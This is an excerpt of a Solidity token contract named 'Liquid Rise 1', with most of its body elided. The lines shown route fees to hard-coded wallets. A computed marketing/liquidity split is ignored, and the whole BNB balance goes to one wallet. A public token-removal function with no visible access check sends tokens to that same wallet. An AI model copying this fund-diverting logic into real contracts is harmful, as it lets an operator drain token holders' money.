...
/**
   telegram : https://t.me/LiquidRise
*/
...
contract Liquid_Rise_1 is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xA8b9f0F6dFB6766B7da4F8909321e8514d1fD20b); 
    address payable public Wallet_Liquid = payable(0x37d6d8DB908D51Cd3F303D8Ef4B44Ad2A85966Df);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 


    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 50**7 * 9**_decimals;
    string private constant _name = "Liquid Rise 1"; 
    string private constant _symbol = unicode"LiquidRise1"; 
    ...
    uint256 public Percent_Liquid = 70;
    ...
    constructor () {
        ...
        _owner = 0x3cAd1714f3940b45a076363BF9fAb4b7DB1BD919;
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            uint256 tokens_to_D = contractTokenBalance * Percent_Liquid / 100;
            ...
            uint256 split_M = Percent_Marketing * 100 / (Percent_AutoLP + Percent_Marketing + Percent_Liquid);
            uint256 BNB_M = BNB_Total * split_M / 100;

            uint256 split_D = Percent_Liquid * 100 / (Percent_AutoLP + Percent_Marketing + Percent_Liquid);
            ...
            sendToWallet(Wallet_Liquid, BNB_Total);
    ...
    function remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
        ...
        _sent = IERC20(random_Token_Address).transfer(Wallet_Liquid, removeRandom);
